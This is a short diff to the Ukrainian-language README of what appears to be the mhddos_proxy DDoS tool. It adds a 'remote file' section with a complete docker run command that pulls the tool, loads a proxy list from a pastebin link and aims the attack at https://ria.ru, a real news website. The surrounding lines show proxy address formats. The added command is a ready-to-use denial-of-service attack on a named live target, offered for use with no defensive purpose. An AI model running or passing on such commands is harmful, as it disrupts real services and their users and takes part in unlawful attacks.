@@ -114,6 +114,10 @@
     socks4://114.231.123.38:1234
     http://114.231.123.38:3065:username:password
 
+#### Віддалений файл (однаково для Python та Docker)
+
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru
+
 #### Для Python
 
 Покладіть файл поруч з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
